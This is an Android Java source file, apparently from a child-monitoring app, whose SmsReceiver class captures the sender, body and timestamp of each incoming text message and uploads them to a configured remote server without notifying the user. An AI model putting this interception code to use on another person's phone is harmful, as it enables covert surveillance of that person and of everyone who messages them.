package com.monitoring.child;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        String format = bundle.getString("format");
        if (pdus == null) return;

        SharedPreferences prefs = context.getSharedPreferences("monitoring_prefs", Context.MODE_PRIVATE);
        String serverIp = prefs.getString("server_ip", null);
        String deviceId = prefs.getString("device_id", null);
        if (serverIp == null || deviceId == null) return;

        try {
            JSONArray messages = new JSONArray();
            for (Object pdu : pdus) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, format);
                if (smsMessage == null) continue;

                JSONObject msg = new JSONObject();
                msg.put("device_id", deviceId);
                msg.put("sender", smsMessage.getDisplayOriginatingAddress());
                msg.put("body", smsMessage.getMessageBody());
                msg.put("timestamp", smsMessage.getTimestampMillis());
                messages.put(msg);
            }

            if (messages.length() == 0) return;

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("messages", messages);

            String url = UrlHelper.getApiUrl(serverIp, "/api/sms/upload");
            RequestBody body = RequestBody.create(
                    payload.toString(),
                    MediaType.parse("application/json; charset=utf-8")
            );
            Request request = new Request.Builder().url(url).post(body).build();

            new OkHttpClient().newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "Failed to upload SMS", e);
                }
                @Override
                public void onResponse(Call call, Response response) {
                    Log.d(TAG, "SMS uploaded, status: " + response.code());
                    response.close();
                }
            });

        } catch (Exception e) {
            Log.e(TAG, "Error processing incoming SMS", e);
        }
    }
}
